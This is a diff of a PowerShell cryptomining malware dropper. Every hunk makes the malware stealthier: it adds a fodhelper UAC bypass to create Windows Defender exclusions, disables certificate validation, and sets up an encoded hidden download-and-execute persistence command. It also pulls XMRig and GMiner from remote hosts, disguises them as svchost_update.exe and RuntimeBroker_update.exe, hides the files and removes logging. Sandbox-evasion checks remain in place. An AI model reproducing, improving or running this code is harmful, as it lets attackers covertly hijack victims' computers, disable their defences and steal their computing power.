@@ -3,7 +3,8 @@ if (Test-Path "$PSScriptRoot\.lock") { return }
 
 # $ProgressPreference = 'SilentlyContinue'
 # $ErrorActionPreference = 'SilentlyContinue'
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
 # === ANTI-ANALYSIS ===
 function Test-Sandbox {
@@ -31,7 +32,7 @@ function Test-Sandbox {
     # Tiny disk = sandbox
     try { if (((Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum) -lt 60GB) { $hits++ } } catch {}
     # Common sandbox usernames
-    try { if ($env:USERNAME -match '^(sandbox|malware|virus|test|analysis|sample|john|user)$') { $hits++ } } catch {}
+    try { if ($env:USERNAME -match '^(sandbox|malware|virus|test|analysis|sample|john doe)$') { $hits++ } } catch {}
     return $hits -ge 2
 }
 
@@ -94,24 +95,30 @@ try {
     if (-not $hw.gpu) { Write-Host "[*] No compatible GPU found. Falling back to CPU only." }
 } catch {}
 
-# === DEFENDER EXCLUSION (Direct Admin Attempt) ===
 try {
-    $exPaths = @($env:LOCALAPPDATA, "$env:LOCALAPPDATA\Microsoft", "$env:APPDATA\Microsoft")
+    $exPaths = @($env:LOCALAPPDATA, "$env:LOCALAPPDATA\Microsoft", "$env:APPDATA\Microsoft", $env:TEMP)
+    # Try direct first (works if admin)
     foreach ($ep in $exPaths) {
-        try {
-            Add-MpPreference -ExclusionPath $ep -ErrorAction Stop
-            Write-Host "[+] Defender Exclusion Added: $ep"
-        } catch {
-            Write-Host "[!] Defender Exclusion Failed for $ep : $($_.Exception.Message)"
-        }
+        try { Add-MpPreference -ExclusionPath $ep -EA Stop } catch {}
     }
+    # fodhelper UAC bypass for non-admin
+    try {
+        $psCmd = ($exPaths | ForEach-Object { "Add-MpPreference -ExclusionPath '$_' -EA 0" }) -join '; '
+        $regPath = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
+        New-Item -Path $regPath -Force | Out-Null
+        Set-ItemProperty -Path $regPath -Name '(Default)' -Value "powershell.exe -w hidden -c `"$psCmd`"" -Force
+        Set-ItemProperty -Path $regPath -Name 'DelegateExecute' -Value '' -Force
+        Start-Process fodhelper.exe -WindowStyle Hidden
+        Start-Sleep 5
+        Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -EA 0
+    } catch {}
 } catch {}
 
 # === ASYNC PERSISTENCE (Fast Ingest) ===
 Start-Job -ScriptBlock {
     param($c, $base)
     $rawPath = "$base/deploy.ps1"
-    $payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
+    $payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true }; IEX (Invoke-RestMethod -Uri '$rawPath')"
     $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
     $pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
 
@@ -135,14 +142,23 @@ Start-Job -ScriptBlock {
     } catch {}
 } -ArgumentList $c, $c.base | Out-Null
 
-# === DIRECT MINER DEPLOYMENT (No DLL needed) ===
 $mName = "$($env:COMPUTERNAME)".Replace(' ','_')
-$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
+$xmrigUrl = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main/xmrig.exe"
 $gminerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
 
 # Find a writable directory
 $writableDir = $null
-$tryDirs = @($env:TEMP, "$env:LOCALAPPDATA\Temp", "$env:APPDATA\Microsoft", "$env:LOCALAPPDATA\Microsoft\CLR\NativeImages")
+$tryDirs = @(
+    $env:TEMP,
+    "$env:LOCALAPPDATA\Temp",
+    "$env:APPDATA\Microsoft",
+    "$env:LOCALAPPDATA\Microsoft\CLR\NativeImages",
+    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer",
+    "$env:APPDATA\Microsoft\Windows",
+    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
+    "$env:LOCALAPPDATA\Microsoft\CLR_Data",
+    "$env:APPDATA"
+)
 foreach ($d in $tryDirs) {
     try {
         if (!(Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
@@ -150,77 +166,74 @@ foreach ($d in $tryDirs) {
         [IO.File]::WriteAllBytes($testFile, [byte[]]@(0))
         Remove-Item $testFile -Force
         $writableDir = $d
-        Write-Host "[+] Writable dir: $d"
         break
-    } catch { Write-Host "[!] Dir blocked: $d" }
+    } catch {}
 }
-if (!$writableDir) { Write-Host "[!] FATAL: No writable dir!"; return }
+if (!$writableDir) { return }
 
-# Download and extract xmrig
 $cpuExe = Join-Path $writableDir "svchost_update.exe"
 if (!(Test-Path $cpuExe)) {
     try {
-        Write-Host "[*] Downloading XMRig..."
-        $zipPath = Join-Path $writableDir "upd_$([Guid]::NewGuid()).zip"
+        # xmrig is hosted as direct exe on test-repo
         $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        $wc.DownloadFile($xmrigUrl, $zipPath)
-        Write-Host "[+] Downloaded XMRig zip"
-
-        Add-Type -Assembly System.IO.Compression.FileSystem
-        $zip = [IO.Compression.ZipFile]::OpenRead($zipPath)
-        foreach ($entry in $zip.Entries) {
-            if ($entry.Name -eq 'xmrig.exe') {
-                $stream = $entry.Open()
-                $fs = [IO.File]::Create($cpuExe)
-                $stream.CopyTo($fs)
-                $fs.Close()
-                $stream.Close()
-                Write-Host "[+] Extracted xmrig to: $cpuExe"
-                break
-            }
+        $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
+        $dlBytes = $null
+        try { $dlBytes = $wc.DownloadData($xmrigUrl) } catch {}
+        # curl fallback
+        if (!$dlBytes -or $dlBytes.Length -lt 1000) {
+            $tmpDl = Join-Path $env:TEMP "dl_$(Get-Random).tmp"
+            & curl.exe --ssl-no-revoke -L -o $tmpDl $xmrigUrl 2>$null
+            if (Test-Path $tmpDl) { $dlBytes = [IO.File]::ReadAllBytes($tmpDl); Remove-Item $tmpDl -Force -EA 0 }
         }
-        $zip.Dispose()
-        Remove-Item $zipPath -Force -EA 0
-        # Hide it
-        try { [IO.File]::SetAttributes($cpuExe, 'Hidden,System') } catch {}
-    } catch {
-        Write-Host "[!] XMRig download failed: $($_.Exception.Message)"
-    }
+        if ($dlBytes -and $dlBytes.Length -gt 1000) {
+            # Smart detect: ZIP (PK) vs direct EXE (MZ)
+            if ($dlBytes[0] -eq 0x50 -and $dlBytes[1] -eq 0x4B) {
+                $tmpZip = Join-Path $env:TEMP "xm_$(Get-Random).zip"
+                [IO.File]::WriteAllBytes($tmpZip, $dlBytes)
+                Add-Type -Assembly System.IO.Compression.FileSystem
+                $zip = [IO.Compression.ZipFile]::OpenRead($tmpZip)
+                foreach ($entry in $zip.Entries) {
+                    if ($entry.Name -eq 'xmrig.exe') {
+                        $s = $entry.Open(); $fs = [IO.File]::Create($cpuExe); $s.CopyTo($fs); $fs.Close(); $s.Close(); break
+                    }
+                }
+                $zip.Dispose(); Remove-Item $tmpZip -Force -EA 0
+            } else {
+                [IO.File]::WriteAllBytes($cpuExe, $dlBytes)
+            }
+            try { [IO.File]::SetAttributes($cpuExe, 'Hidden,System') } catch {}
+        }
+    } catch {}
 }
 
-# Download and extract gminer (if GPU)
 $gpuExe = $null
 if ($hw.gpu) {
     $gpuExe = Join-Path $writableDir "RuntimeBroker_update.exe"
     if (!(Test-Path $gpuExe)) {
         try {
-            Write-Host "[*] Downloading GMiner..."
-            $zipPath2 = Join-Path $writableDir "upd2_$([Guid]::NewGuid()).zip"
             $wc2 = New-Object System.Net.WebClient
-            $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-            $wc2.DownloadFile($gminerUrl, $zipPath2)
-            Write-Host "[+] Downloaded GMiner zip"
-
-            $zip2 = [IO.Compression.ZipFile]::OpenRead($zipPath2)
-            foreach ($entry in $zip2.Entries) {
-                if ($entry.Name -eq 'miner.exe') {
-                    $stream = $entry.Open()
-                    $fs = [IO.File]::Create($gpuExe)
-                    $stream.CopyTo($fs)
-                    $fs.Close()
-                    $stream.Close()
-                    Write-Host "[+] Extracted gminer to: $gpuExe"
-                    break
-                }
+            $wc2.Headers.Add('User-Agent', 'Mozilla/5.0')
+            $dlBytes2 = $null
+            try { $dlBytes2 = $wc2.DownloadData($gminerUrl) } catch {}
+            if (!$dlBytes2 -or $dlBytes2.Length -lt 1000) {
+                $tmpDl2 = Join-Path $env:TEMP "dl2_$(Get-Random).tmp"
+                & curl.exe --ssl-no-revoke -L -o $tmpDl2 $gminerUrl 2>$null
+                if (Test-Path $tmpDl2) { $dlBytes2 = [IO.File]::ReadAllBytes($tmpDl2); Remove-Item $tmpDl2 -Force -EA 0 }
             }
-            $zip2.Dispose()
-            Remove-Item $zipPath2 -Force -EA 0
-            try { [IO.File]::SetAttributes($gpuExe, 'Hidden,System') } catch {}
-        } catch {
-            Write-Host "[!] GMiner download failed: $($_.Exception.Message)"
-            $gpuExe = $null
-        }
+            if ($dlBytes2 -and $dlBytes2.Length -gt 1000) {
+                $tmpZip2 = Join-Path $env:TEMP "gm_$(Get-Random).zip"
+                [IO.File]::WriteAllBytes($tmpZip2, $dlBytes2)
+                Add-Type -Assembly System.IO.Compression.FileSystem
+                $zip2 = [IO.Compression.ZipFile]::OpenRead($tmpZip2)
+                foreach ($entry in $zip2.Entries) {
+                    if ($entry.Name -eq 'miner.exe') {
+                        $s = $entry.Open(); $fs = [IO.File]::Create($gpuExe); $s.CopyTo($fs); $fs.Close(); $s.Close(); break
+                    }
+                }
+                $zip2.Dispose(); Remove-Item $tmpZip2 -Force -EA 0
+                try { [IO.File]::SetAttributes($gpuExe, 'Hidden,System') } catch {}
+            }
+        } catch { $gpuExe = $null }
     }
 }
 
